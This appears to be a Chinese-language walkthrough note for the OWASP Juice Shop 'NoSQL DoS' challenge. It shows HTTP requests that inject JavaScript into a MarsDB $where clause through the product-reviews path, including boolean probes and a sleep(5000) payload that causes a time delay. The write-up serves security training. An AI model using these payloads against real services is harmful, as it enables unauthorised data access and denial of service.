---
title: NoSQL DoS
description: 除了常规使用单引号的探测方式外，还应当对引号外或作为字符串代码执行的情况进行探测
---
- 产品与用户内容使用 SQLite 数据库，寻找 MongoDB，之前挑战中已知产品评论使用 MongoDB
    ```GET /rest/products/1/reviews HTTP/1.1```
- 对商品 id 参数进行探测
    - 提交 ```GET /rest/products/1'/reviews HTTP/1.1```
    - 得到错误信息 
        ```
        "message": "Invalid or unexpected token",
        "stack": "SyntaxError: Invalid or unexpected token
            at Function (<anonymous>)
                at Object.$where (/juice-shop/node_modules/marsdb/dist/DocumentMatcher.js:419:23)
        ```
        - 当前注入点在 where 子句内
    - 输入 ```1+1``` 查看是否返回商品 ```2``` 的评论
    ```GET /rest/products/1%2b1/reviews HTTP/1.1```
    响应为商品2的评论
    - 此处无需常规探测向量的单引号 ```'```
    - 输入 true
        响应第一个商品的信息
    - 输入 false
        得到空 JSON
    - 输入 1||1
        返回全部
    - true 与 false 似乎被强制转为数字 1 与 0
- 使用休眠函数通过挑战
    ```GET /rest/products/sleep(5000)/reviews HTTP/1.1```
- MongoDB 时间盲注漏洞点